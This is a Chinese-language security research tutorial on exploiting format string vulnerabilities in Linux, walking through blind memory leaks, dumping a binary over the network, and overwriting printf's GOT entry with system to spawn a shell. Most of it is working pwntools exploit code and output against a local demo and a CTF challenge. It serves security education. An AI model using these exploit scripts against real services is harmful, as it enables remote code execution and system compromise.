# Linux系统下格式化字符串利用研究

> 来源：http://paper.seebug.org/246/

Author: **[Hcamael](http://0x48.pw/2017/01/06/0x2c/) (知道创宇404安全实验室)**

Date: 2017-03-14

格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究。

格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。

## Leak Memory

先来对一个简单的Demo进行研究:

```
// fmt_test.c

int main(int argc, char * argv[]) {
    char a[1024];
    memset(a, '\0', 1024);
    read(0, a, 1024);
    printf(a);
    return 0;
}

// $ gcc fmt_test.c -o fmt_test -m32
// $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test
```

假设我们不知道该程序的源码，连bin都没有，只是能访问一个这样的应用:

```
$ nc 127.0.0.1 10001                       
aaaaaaa  
aaaaaaa
```

在这种情况下，就是去尝试各种漏洞的攻击方法，比如栈溢出漏洞就输入一堆字符，比如 `100*"a"` ，而格式化字符串漏洞是使用"%x"这类格式化字符串去尝试，比如:

```
$ nc 127.0.0.1 10001
%x
2c51cce0
```

得到了这样的返回就说明该应用存在格式化字符串漏洞了，因为没有源代码或bin，并不知道要往哪写啥数据，所以我们可以先leak memory，获取该应用的源码

leak memory利用到的是 `%s` 格式化字符，它的作用是输出对应参数指向地址的值，也就是说它对应的参数是一个指针，而我们可以得到该指针对应内存数据

我们还可以继续改进该格式化字符， `%2$s` ，它表示的意义是输出第二个参数指向的内存的值

那么我们怎么通过上面的格式化字符获取我们想要的内存的地址呢？这就涉及第三个知识点。

格式化字符串漏洞是怎么产生的？首先要有一个函数，比如 `read` , 比如 `gets` 获取用户输入的数据储存到局部变量中，然后直接把该变量作为 `printf` 这类函数的第一个参数值

其中局部变量是储存在栈中，而且是储存在栈的高位地址上，这里具体细节可以去读读汇编代码，简单的说，进入到一个函数中后，会 `sub rsp,xxx` 一段局部变量的栈空间，然后函数的参数啥的都是push到局部变量的栈空间之上

理解了上述的知识点后，我们可以输入想leak数据的内存地址，然后爆破出我们输入数据的位置，不就能leak相应地址的内存的数据了么

比如我输入 `ABCD%2$x` ，如果输出 `ABCD` 十六进制值，则说明第二个参数为我们输入的数据的起始位置.

```
$ nc 127.0.0.1 10001
ABCD%2$x  
ABCD400

$ nc 127.0.0.1 10001
ABCD%3$x  
ABCD174

$ nc 127.0.0.1 10001
ABCD%4$x  
ABCD174

....

$ nc 127.0.0.1 10001
ABCD%11$x  
ABCD44434241
```

这样我们就能得到payload: `addr + %11$s` , 返回值为 `addr` 指向的内存的字符串，直到 `\0` 为止

这里我们可以进行测试下(我们现在是处于研究状态，虽然假想没bin，但实际我们是有的，所以可以进行测试来证明我们的结论)

```
$ objdum -d fmt_test -M intel

....

080485c4 <_fini>:  
 80485c4:    53                      push   ebx
 80485c5:    83 ec 08                sub    esp,0x8
 80485c8:    e8 33 fe ff ff          call   8048400 <__x86.get_pc_thunk.bx>
 80485cd:    81 c3 33 1a 00 00       add    ebx,0x1a33
 80485d3:    83 c4 08                add    esp,0x8
 80485d6:    5b                      pop    ebx
 80485d7:    c3                      ret    

$ py                          
>>> from pwn import *

>>> p = remote("127.0.0.1",10001)
[x] Opening connection to 127.0.0.1 on port 10001
[x] Opening connection to 127.0.0.1 on port 10001: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 10001: Done

>>> p.send(p32(0x80485c4)+"%11$s")

>>> p.recv()
'\xc4\x85\x04\x08S\x83\xec\x08\xe83\xfe\xff\xff\x81\xc33\x1a'

>>>
```

从上面的测试代码中可以证明上述所讲的结论, 我们成功leak出相应内存的数据(直到 `\x00` 为止)

上面爆破出来的11我们称为offset，pwntools有自动化代码可以算出offset:

```
# fmt_test.py
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

def exec_fmt(payload):  
    p = process("a.out")
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info

autofmt = FmtStr(exec_fmt)  
print autofmt.offset
```

我们可以看看其中一条DEBUG数据和结果:

```
$ python fmt_test.py

...

[+] Starting local process './a.out' argv=['a.out'] : Done
[DEBUG] Sent 0x22 bytes:
    'aaaabaaacaaadaaaeaaaSTART%11$pEND\n'
[DEBUG] Received 0x27 bytes:
    'aaaabaaacaaadaaaeaaaSTART0x61616161END\n'
[*] Stopped program './a.out'
[*] Found format string offset: 11
11
```

测试完了，现在又恢复到没bin状态，有了前面的基础，要dump出整个bin就很容易了

在Linux下，不开PIE保护时，32位的ELF的默认首地址为 `0x8048000` ，如果开启了PIE保护，则需要根据ELF的魔术头 `7f 45 4c 46` 进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止

但是这时候还存在一个问题: 比如我的Payload为:

```
p = remote("127.0.0.1",10001)  
p.send(p32(0x8048000)+"%11$s")  
print p.recv()
```

得到的结果是

```
$ python fmt_test.py
...
Traceback (most recent call last):  
  ...
EOFError  
...
```

发生了EOFError, 这是因为

```
>>> p32(0x8048000)
'\x00\x80\x04\x08'
```

`printf` 根据 `\x00` 判断结尾

所以我们需要更改下payload

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'  
p = remote("127.0.0.1",10001)  
p.send("%13$saaa" + p32(0x8048000))  
print p.recv()
```

可以成功dump数据了:

```
$ python fmt_test.py
[+] Starting local process './a.out' argv=['a.out'] : Done
[DEBUG] Sent 0xc bytes:
    00000000  25 31 33 24  73 61 61 61  00 80 04 08               │%13$│saaa│····││
    0000000c
[DEBUG] Received 0xa bytes:
    00000000  7f 45 4c 46  01 01 01 61  61 61                     │·ELF│···a│aa│
    0000000a
```

原理都懂了，可以写payload去dump 整个bin回来了

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'  
f = open("source.bin", "ab+")

begin = 0x8048000  
offset = 0

while True:  
    addr = begin + offset
    p = process("a.out")
    p.sendline("%13$saaa" + p32(addr))
    try:
        info = p.recvuntil("aaa")[:-3]
    except EOFError:
        print offset
        break
    info += "\x00"
    p.close()
    offset += len(info)
    f.write(info)
    f.flush()

f.close()
```

内存数据dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到ida中任然是可以看的:

![](http://img1.tuicool.com/rEvQ7vj.png!web)

## Write

二进制漏洞的最终目的都是要getshell，所以在我们获取到bin后，接下来就是要getshell了

不过之前的demo过于简单，没有什么好的getshell的方法，对demo进行下修改.

```
// fmt_test2.c
#include <stdio.h>

int main(int argc, char * argv[]) {
    char a[1024];
    while(1) 
    {
        memset(a, '\0', 1024);
        read(0, a, 1024);
        printf(a);
        fflush(stdout);
    }
    return 0;
}

// $ gcc fmt_test2.c -o fmt_test2 -m32
// $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test2
```

和之前的demo比，多了循环，不像之前一样一下就退出了

在这种情况下，我们可以很容易只依靠格式化字符串漏洞进行攻击

利用的逻辑很简单，根据之前的知识点，leak出bin，然后获取到 `printf` 函数的got表地址，然后把这个地址的值改为 `system` 函数的地址，在下次循环的时候，输入 `/bin/sh` ，则 `printf(a);` 实际执行的却是 `system('/bin/sh')`

利用过程中，第一个知识点: dump 内存数据，也就是上面的内容，得到bin后，可以很容易的获取到got表信息

接下来第二个知识点就是获取 `system` 函数的地址，不过却需要爆破跑

每次我首先获取 `printf` 函数的地址，然后再根据自己机子上 `printf` 和 `system` 函数之间的差值估测一个大概范围进行爆破，得到的数据和 `system` 函数中的一些特征数据进行对比，判断是否是system函数

这一步跳过，现在假设自己有libc库，我本地的libc中， `printf` 和 `system` 函数的差值为: `59600`

最后一步，就是通过格式化字符串内容进行写内存了，覆盖got表中的值

这里我们可以使用pwntools神器:

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'  
printf_got = 0x804a010  
system_add = 0xaaaaaaaa

def exec_fmt(payload):  
    p.sendline(payload)
    return p.recv()

p = remote("127.0.0.1", 10001)  
autofmt = FmtStr(exec_fmt)  
payload = fmtstr_payload(autofmt.offset, {printf_got: system_add})
```

上述代码中 `autofmt = FmtStr(exec_fmt)` 到这行的内容之前都讲过，接下来就是 `fmtstr_payload` 函数，这个函数的作用是用来生成格式化字符串漏洞写内存的payload.

上述代码的第一个参数为offset偏移，第二个参数是一个字典，意义是往key的地址，写入value的值，也就是往 `0x804a010` 地址写入数据 `0xaaaaaaaa`

我们来看看输出的payload:

```
...
>>> payload = fmtstr_payload(autofmt.offset, {printf_got: system_add})
>>> payload
'\x10\xa0\x04\x08\x11\xa0\x04\x08\x12\xa0\x04\x08\x13\xa0\x04\x08%154c%11$hhn%12$hhn%13$hhn%14$hhn'
```

开头16bytes是4个地址:

```
0x0804a010  
0x0804a011  
0x0804a012  
0x8004a012
```

然后是格式化字符串: `%154c` , 输出hex(154)==0x9a bytes的字符，再加上之前的16bytes地址，一共有0xaa bytes

第三部分也是格式化字符串: `%11$hhn%12$hhn%13$hhn%14$hhn` ，往第11, 12, 13, 14个参数指向的地址写入一个值，该值等于之前输出的byte数，在这里就是0xaa

而偏移值为11, 所以第11个参数为payload头，也就是 `0x0804a010` ，然后以此类推

就是通过上述逻辑往相应地址写入相应值的

所以可以写出exp:

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

p = remote("127.0.0.1", 10001)

# 获取printf的libc地址
printf_got = 0x804a010  
leak_payload = "b%13$saa" + p32(printf_got)

p.sendline(leak_payload)

p.recvuntil("b")  
info = p.recvuntil("aa")[:-2]  
print info.encode('hex')

# 计算system的libc地址
print_add = u32(info[:4])  
p_s_offset = 59600     # addr(printf) - addr(system) 
system_add = print_add - p_s_offset

# 生成payload
payload = fmtstr_payload(11, {printf_got: system_add})

# 发送payload
p.sendline(payload)  
p.sendline('/bin/sh')  
p.interactive()
```

## 总结

在前几天的NJCTF中有一个pingme的PWN题就是没有源码的格式化字符串漏洞.

二进制文件我拖下来了在我的Github &lt;sup&gt;2&lt;/sup&gt; 上

有兴趣的可以自己搭个环境试试看，该题就是只有一个远程可访问的服务，没有bin和libc，不过这题的libc可以通过别的题获取到，所以也可以算是已知libc的题

思路同我上面demo所讲.

## 参考

1.  [格式化字符串漏洞简介](http://paper.seebug.org/papers/Archive/drops2/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
2.  [https://github.com/Hcamael/CTF_repo/tree/master/NJCTF%202017/Pwn200(pingme)](https://github.com/Hcamael/CTF_repo/tree/master/NJCTF%202017/Pwn200(pingme))
3.  [http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html](http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html)